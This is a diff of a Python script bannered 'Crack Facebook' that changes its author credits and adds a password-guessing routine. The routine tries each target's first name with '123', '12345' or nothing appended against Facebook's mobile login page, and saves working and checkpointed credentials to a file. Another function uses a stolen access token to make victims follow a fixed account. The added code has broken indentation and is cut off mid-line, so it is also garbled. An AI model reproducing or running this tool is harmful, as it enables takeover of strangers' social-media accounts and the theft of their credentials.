@@ -42,8 +42,8 @@ logo = """\033[1;93m_/﹋\_
 \033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
 \033[1;36m_/﹋\_\033[0m
 \033[1;31m╔════════════════════════════════════════╗
-\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
-\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
+\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mHASAN ALBANA \033[0m               \033[1;31m║
+\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/pembururondo66/Vj\033[0m    \033[1;31m║
 \033[1;31m╚════════════════════════════════════════╝\033[0m"""
 
 idmem = []
@@ -151,7 +151,7 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		masuk()
-    	requests.post('https://graph.facebook.com/100005344214417/subscribers?access_token=' + toket)      #Dapunta Khurayra X
+    	requests.post('https://graph.facebook.com/100005344214417/subscribers?access_token=' + toket)      
     	menu()
 			
 def menu():
@@ -263,9 +263,60 @@ def main(arg):
           pass1 = b['first_name'].lower()+'123'
           rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass1, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
           xo = rex.content
-		
-
-
+          if 'mbasic_logout_button' in xo or 'save-device' in xo:
+             print '\x1b[0;32m   [OK] '+user+' • '+pass1+' • '+tl
+             oke = open('done/Indo.txt', 'a')
+             oke.write('\n[OK] '+user+' • '+pass1)
+             oke.close()
+             oks.append(user+pass1)
+        else :
+             if 'checkpoint' in xo:
+	         print '\x1b[0;33m   [CP] '+user+' • '+pass1+' • '+tl
+                 cek = open('done/Indo.txt', 'a')
+                 cek.write('\n[CP] '+user+' • '+pass1)
+                 cek.close()
+                 cekpoint.append(user+pass1)
+        else:
+          pass2 = b['first_name'].lower()+'12345'
+          rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
+             xo = rex.content
+             if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                 print '\x1b[0;32m   [OK] '+user+' • '+pass2+' • '+tl
+                 oke = open('done/Indo.txt', 'a')
+                 oke.write('\n[OK] '+user+' • '+pass2)
+                 oke.close()
+                 oks.append(user+pass2)
+        else:
+          if 'checkpoint' in xo:
+              print '\x1b[0;33m   [CP] '+user+' • '+pass2+' • '+tl
+              cek = open('done/Indo.txt', 'a')
+              cek.write('\n[CP] '+user+' • '+pass2)
+              cek.close()
+              cekpoint.append(user+pass2)
+       else:
+         pass3 = b['first_name'].lower()
+              rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
+              xo = rex.content
+              if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                 print '\x1b[0;32m   [OK] '+user+' • '+pass3+' • '+tl
+                 oke = open('done/Indo.txt', 'a')
+                 oke.write('\n[OK] '+user+' • '+pass3)
+                 oke.close()
+                 oks.append(user+pass3)
+       else:
+         if 'checkpoint' in xo:
+             print '\x1b[0;33m   [CP] '+user+' • '+pass3+' • '+tl
+             cek = open('done/Indo.txt', 'a')
+             cek.write('\n[CP] '+user+' • '+pass3)
+             cek.close()
+             cekpoint.append(user+pass3)
+       else:
+           rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass4, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"})
+            xo = rex.content
+            if 'mbasic_logout_button' in xo or 'save-device' in xo:
+               print '\x1b[0;32m   [OK] '+user+' • '+pass4+' • '+tl
+               oke = open('done/Indo.txt', 'a')
+oke.write('\n[OK] '+
 	
 def updatesc():
 	os.system("clear")
